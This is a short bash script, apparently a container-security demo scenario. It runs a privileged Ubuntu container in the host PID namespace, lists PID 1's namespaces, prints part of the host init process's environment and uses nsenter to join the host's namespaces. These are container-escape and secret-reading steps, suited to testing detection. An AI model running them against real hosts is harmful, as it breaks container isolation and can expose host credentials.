#!/bin/bash
set -e

SCENARIO_NAME="s2_priv_pid_$RANDOM"

echo "=== S2: Privileged Container with Host PID Demo ==="
echo "Scenario: $SCENARIO_NAME"

cleanup() {
    echo "Cleaning up..."
    docker rm -f "$SCENARIO_NAME" >/dev/null 2>&1 || true
}

cleanup
trap cleanup EXIT

echo "1. Running privileged container with host PID namespace..."
docker run --name "$SCENARIO_NAME" \
    --privileged \
    --pid=host \
    --rm \
    ubuntu:22.04 bash -c "
    echo 'Checking host namespaces...'
    ls -la /proc/1/ns/

    echo 'Reading sensitive host env...'
    cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -5 || echo 'Cannot read process env'

    echo 'Executing nsenter to join host mount namespace...'
    nsenter -t 1 -m -u -i -n -- hostname 2>/dev/null || echo 'nsenter attempted'

    echo 'Creating test file...'
    echo 'test data' > /tmp/priv_test_\$RANDOM.txt

    sleep 1
"

echo "=== S2 Complete ==="
